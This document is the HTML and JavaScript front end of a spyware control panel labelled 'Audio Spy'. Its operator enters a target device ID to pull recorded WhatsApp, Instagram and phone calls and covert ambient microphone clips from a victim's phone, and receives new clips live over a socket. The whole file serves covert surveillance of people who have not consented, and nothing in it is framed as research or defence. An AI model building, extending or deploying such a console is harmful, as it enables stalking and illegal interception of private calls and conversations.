<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Audio Surveillance Console</title>
    
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600&display=swap" rel="stylesheet">
    
    <script src="/socket.io/socket.io.js"></script>

    <style>
        :root {
            --bg-dark: #050509;
            --card-bg: rgba(22, 27, 34, 0.8);
            --border: rgba(255, 255, 255, 0.1);
            --accent-red: #ff3b30;
            --accent-blue: #0a84ff;
            --accent-green: #30d158;
            --text-main: #ffffff;
            --text-muted: #8b949e;
            --glass: blur(12px);
        }

        body {
            font-family: 'Inter', sans-serif;
            background-color: var(--bg-dark);
            background-image: radial-gradient(circle at top, #161b22 0%, #000 100%);
            color: var(--text-main);
            margin: 0;
            padding: 0;
            min-height: 100vh;
        }

        /* --- HEADER AREA --- */
        .header {
            position: sticky;
            top: 0;
            z-index: 100;
            background: rgba(5, 5, 9, 0.9);
            backdrop-filter: var(--glass);
            border-bottom: 1px solid var(--border);
            padding: 15px 20px;
            display: flex;
            flex-direction: column;
            gap: 15px;
            box-shadow: 0 4px 20px rgba(0,0,0,0.5);
        }

        .top-bar {
            display: flex;
            justify-content: space-between;
            align-items: center;
        }

        .title {
            font-size: 1.2rem;
            font-weight: 600;
            letter-spacing: 0.5px;
            display: flex;
            align-items: center;
            gap: 10px;
        }

        .live-badge {
            font-size: 0.7rem;
            background: rgba(255, 59, 48, 0.15);
            color: var(--accent-red);
            padding: 4px 10px;
            border-radius: 20px;
            border: 1px solid rgba(255, 59, 48, 0.3);
            display: flex;
            align-items: center;
            gap: 6px;
        }

        .dot {
            width: 6px;
            height: 6px;
            background: var(--accent-red);
            border-radius: 50%;
            animation: pulse 1.5s infinite;
        }

        @keyframes pulse {
            0% { box-shadow: 0 0 0 0 rgba(255, 59, 48, 0.7); }
            70% { box-shadow: 0 0 0 6px rgba(255, 59, 48, 0); }
            100% { box-shadow: 0 0 0 0 rgba(255, 59, 48, 0); }
        }

        /* --- INPUT AREA --- */
        .search-container {
            display: flex;
            gap: 10px;
        }

        input {
            flex: 1;
            background: #0d1117;
            border: 1px solid var(--border);
            padding: 12px;
            border-radius: 8px;
            color: white;
            font-family: monospace;
            outline: none;
            transition: 0.3s;
        }

        input:focus { border-color: var(--accent-blue); }

        button.action-btn {
            background: var(--accent-blue);
            border: none;
            color: white;
            padding: 0 20px;
            border-radius: 8px;
            font-weight: 600;
            cursor: pointer;
            transition: 0.2s;
        }
        
        button.action-btn:active { transform: scale(0.96); }

        /* --- FILTERS --- */
        .filters {
            display: flex;
            gap: 10px;
            overflow-x: auto;
            padding-bottom: 5px;
            scrollbar-width: none; /* Hide scrollbar */
        }

        .filter-pill {
            background: rgba(255,255,255,0.05);
            border: 1px solid var(--border);
            padding: 8px 16px;
            border-radius: 20px;
            font-size: 0.85rem;
            color: var(--text-muted);
            cursor: pointer;
            white-space: nowrap;
            transition: 0.3s;
        }

        .filter-pill.active {
            background: var(--text-main);
            color: #000;
            font-weight: 600;
            border-color: var(--text-main);
        }

        /* --- RECORDING LIST --- */
        .container {
            max-width: 800px;
            margin: 20px auto;
            padding: 0 15px;
            padding-bottom: 80px;
        }

        .card {
            background: var(--card-bg);
            border: 1px solid var(--border);
            border-radius: 12px;
            padding: 15px;
            margin-bottom: 15px;
            display: flex;
            flex-direction: column;
            gap: 12px;
            animation: slideUp 0.4s ease;
        }

        @keyframes slideUp {
            from { opacity: 0; transform: translateY(20px); }
            to { opacity: 1; transform: translateY(0); }
        }

        .card-top {
            display: flex;
            justify-content: space-between;
            align-items: center;
        }

        .file-info {
            display: flex;
            align-items: center;
            gap: 12px;
        }

        .icon-box {
            width: 40px;
            height: 40px;
            border-radius: 10px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 1.2rem;
            background: rgba(255,255,255,0.05);
        }

        .whatsapp { color: #25D366; background: rgba(37, 211, 102, 0.1); }
        .instagram { color: #E1306C; background: rgba(225, 48, 108, 0.1); }
        .call { color: #0a84ff; background: rgba(10, 132, 255, 0.1); }
        .mic { color: #ff3b30; background: rgba(255, 59, 48, 0.1); }

        .details h4 { margin: 0; font-size: 0.95rem; font-weight: 500; }
        .details span { font-size: 0.75rem; color: var(--text-muted); }

        /* Audio Player Styling */
        audio {
            width: 100%;
            height: 36px;
            border-radius: 20px;
            filter: invert(1) hue-rotate(180deg); /* Dark Mode Audio Player */
            opacity: 0.8;
        }

        .status-msg {
            text-align: center;
            color: var(--text-muted);
            margin-top: 50px;
            font-size: 0.9rem;
        }

    </style>
</head>
<body>

    <div class="header">
        <div class="top-bar">
            <div class="title">
                <i class="fa-solid fa-user-secret"></i> Audio Spy
            </div>
            <div class="live-badge">
                <div class="dot"></div> LIVE
            </div>
        </div>

        <div class="search-container">
            <input type="text" id="deviceIdInput" placeholder="ENTER TARGET ID...">
            <button class="action-btn" onclick="manualLoad()">LOAD</button>
        </div>

        <div class="filters">
            <div class="filter-pill active" onclick="filterBy('All', this)">All</div>
            <div class="filter-pill" onclick="filterBy('WhatsApp', this)">WhatsApp</div>
            <div class="filter-pill" onclick="filterBy('Instagram', this)">Instagram</div>
            <div class="filter-pill" onclick="filterBy('Call', this)">Calls</div>
            <div class="filter-pill" onclick="filterBy('Mic', this)">Env. Mic</div>
        </div>
    </div>

    <div class="container" id="recordingsList">
        <div class="status-msg">Waiting for Target ID...</div>
    </div>

    <script>
        const socket = io();
        let allRecordings = [];
        let currentFilter = 'All';
        let currentDeviceId = '';
        
        // ðŸ”¥ AUTO LOAD LOGIC (Jesa Call History me tha)
        window.onload = () => {
            const savedID = localStorage.getItem('spy_device_id');
            if (savedID) {
                document.getElementById('deviceIdInput').value = savedID;
                currentDeviceId = savedID;
                fetchHistory(); // Page khulte hi load karega
                joinSocketRoom(savedID); // Socket ko bhi bata do
            }
        };

        // âœ… 1. LIVE SOCKET LISTENER
        socket.on('new-audio', (data) => {
            // Sirf wahi dikhao jo selected ID ka ho
            if(currentDeviceId && data.device_id !== currentDeviceId) return;

            console.log("ðŸ”Š New Audio Received:", data);

            const processed = {
                app: detectApp(data.name),
                date: new Date().toLocaleDateString(),
                time: new Date().toLocaleTimeString([], {hour: '2-digit', minute:'2-digit'}),
                url: data.url,
                id: data.device_id
            };

            allRecordings.unshift(processed);
            render();
            
            // Notification sound play kar sakte ho yahan
        });

        // âœ… 2. MANUAL LOAD BUTTON
        function manualLoad() {
            const inputVal = document.getElementById('deviceIdInput').value.trim().toUpperCase();
            if(!inputVal) return alert("Enter Device ID!");
            
            currentDeviceId = inputVal;
            localStorage.setItem('spy_device_id', currentDeviceId); // Save for next time
            
            fetchHistory();
            joinSocketRoom(currentDeviceId);
        }

        // Socket Join Room (Optional, agar server pe room logic hai)
        function joinSocketRoom(id) {
            socket.emit('join', id);
        }

        // âœ… 3. FETCH HISTORY API
        async function fetchHistory() {
            document.getElementById('recordingsList').innerHTML = `<div class="status-msg">Fetching Data...</div>`;

            try {
                const res = await fetch(`/api/audio-history/${currentDeviceId}`);
                const data = await res.json();

                if(Array.isArray(data) && data.length > 0) {
                    allRecordings = data.map(file => processCloudinaryFile(file));
                    render();
                } else {
                    document.getElementById('recordingsList').innerHTML = `<div class="status-msg">No recordings found for ${currentDeviceId}.</div>`;
                    allRecordings = [];
                }
            } catch (e) {
                console.error(e);
                document.getElementById('recordingsList').innerHTML = `<div class="status-msg" style="color:red">Server Error!</div>`;
            }
        }

        // âœ… 4. RENDER UI
        function render() {
            const container = document.getElementById('recordingsList');
            container.innerHTML = '';

            const filtered = allRecordings.filter(rec => 
                currentFilter === 'All' ? true : rec.app === currentFilter
            );

            if(filtered.length === 0) {
                container.innerHTML = `<div class="status-msg">No audio clips found.</div>`;
                return;
            }

            filtered.forEach(rec => {
                const iconInfo = getIconInfo(rec.app);

                const html = `
                    <div class="card">
                        <div class="card-top">
                            <div class="file-info">
                                <div class="icon-box ${iconInfo.cls}">
                                    <i class="${iconInfo.icon}"></i>
                                </div>
                                <div class="details">
                                    <h4>${rec.app} Recording</h4>
                                    <span>${rec.date} â€¢ ${rec.time}</span>
                                </div>
                            </div>
                        </div>
                        <audio controls controlsList="nodownload">
                            <source src="${rec.url}" type="audio/mp4">
                            <source src="${rec.url}" type="audio/mpeg">
                            Your browser does not support audio.
                        </audio>
                    </div>
                `;
                container.innerHTML += html;
            });
        }

        // --- HELPERS ---

        function processCloudinaryFile(file) {
            const d = new Date(file.created_at);
            return {
                app: detectApp(file.filename || file.public_id),
                date: d.toLocaleDateString(),
                time: d.toLocaleTimeString([], {hour: '2-digit', minute:'2-digit'}),
                url: file.secure_url,
                id: currentDeviceId
            };
        }

        function detectApp(name) {
            if(!name) return "Call";
            name = name.toLowerCase();
            if(name.includes('whatsapp')) return 'WhatsApp';
            if(name.includes('instagram')) return 'Instagram';
            if(name.includes('telegram')) return 'Telegram';
            if(name.includes('mic')) return 'Mic';
            return 'Call';
        }

        function getIconInfo(app) {
            if(app === 'WhatsApp') return { cls: 'whatsapp', icon: 'fab fa-whatsapp' };
            if(app === 'Instagram') return { cls: 'instagram', icon: 'fab fa-instagram' };
            if(app === 'Mic') return { cls: 'mic', icon: 'fas fa-microphone-lines' };
            return { cls: 'call', icon: 'fas fa-phone-volume' };
        }

        function filterBy(filter, btnElement) {
            currentFilter = filter;
            
            // Toggle Active Class
            document.querySelectorAll('.filter-pill').forEach(btn => btn.classList.remove('active'));
            btnElement.classList.add('active');
            
            render();
        }

    </script>
</body>
</html>
